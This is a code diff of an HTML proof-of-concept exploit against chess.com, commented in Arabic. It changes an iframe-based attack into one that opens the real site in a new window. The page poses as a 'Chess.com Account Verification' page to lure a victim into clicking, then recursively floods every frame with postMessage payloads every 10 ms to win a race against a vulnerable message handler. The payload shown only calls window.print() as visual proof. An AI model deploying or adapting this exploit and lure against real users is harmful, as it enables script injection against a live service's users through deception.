@@ -2,54 +2,62 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Chess.com Critical XSS PoC</title>
+    <title>Chess.com Account Verification</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f4f4f4;}
-        iframe { border: 2px solid #333; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
+        body { font-family: Arial, sans-serif; text-align: center; padding: 100px; background-color: #f4f4f4;}
+        button { padding: 15px 30px; font-size: 20px; background-color: #3182ce; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        button:hover { background-color: #2b6cb0; }
     </style>
 </head>
 <body>
-    <h1>Chess.com Account Security Check</h1>
-    <p>Please wait while we verify your session...</p>
+    <h1>Chess.com Security Check</h1>
+    <p>Please click the button below to verify your account session.</p>
     
-    <iframe id="victim_frame" src="https://www.chess.com" width="800" height="600"></iframe>
+    <button onclick="startAttack()">Verify Account</button>
 
     <script>
         // Payload الإثبات البصري (نافذة الطباعة)
         let payload = "window.print(); // get_ext";
+        let spammer;
 
+        // دالة الضرب العنقودي (Recursion)
         function blastFrames(win) {
             try {
-                // إرسال الرسالة لأي Iframe نقابله
                 win.postMessage(payload, "*");
             } catch(e) {}
             
-            // الدخول في الأعماق (Recursion)
             try {
+                // الدخول للـ Iframes اللي جوه النافذة الجديدة
                 for (let i = 0; i < win.frames.length; i++) {
                     blastFrames(win.frames[i]);
                 }
             } catch(e) {}
         }
 
-        // تشغيل الهجوم بعد ما المتصفح يبدأ يحمل الـ Iframe
-        setTimeout(() => {
-            console.log("Starting the blast...");
-            // نضرب كل 10 ملي ثانية عشان نكسب الـ Race Condition
-            let spammer = setInterval(() => {
-                let target = document.getElementById('victim_frame').contentWindow;
-                if(target) {
-                    blastFrames(target);
-                }
-            }, 10);
+        // دالة الهجوم اللي بتشتغل لما الضحية يدوس على الزرار
+        function startAttack() {
+            // 1. فتح الموقع في نافذة جديدة أو تاب جديدة
+            let victimWin = window.open("https://www.chess.com", "victimWindow");
 
-            // نوقف الضرب بعد 10 ثواني عشان المتصفح ميهنجش
+            // 2. نستنى 3 ثواني لحد ما الموقع يحمل إعلاناته
             setTimeout(() => {
-                clearInterval(spammer);
-                console.log("Blasting finished.");
-            }, 10000);
+                console.log("Starting the blast...");
+                
+                // 3. نضرب النافذة الجديدة كل 10 ملي ثانية
+                spammer = setInterval(() => {
+                    if(victimWin) {
+                        blastFrames(victimWin);
+                    }
+                }, 10);
 
-        }, 3000); // نستنى 3 ثواني الأول عشان الموقع يلحق يفتح
+                // 4. نوقف الضرب بعد 10 ثواني عشان المتصفح ميهنجش
+                setTimeout(() => {
+                    clearInterval(spammer);
+                    console.log("Blasting finished.");
+                }, 10000);
+
+            }, 3000);
+        }
     </script>
 </body>
 </html>
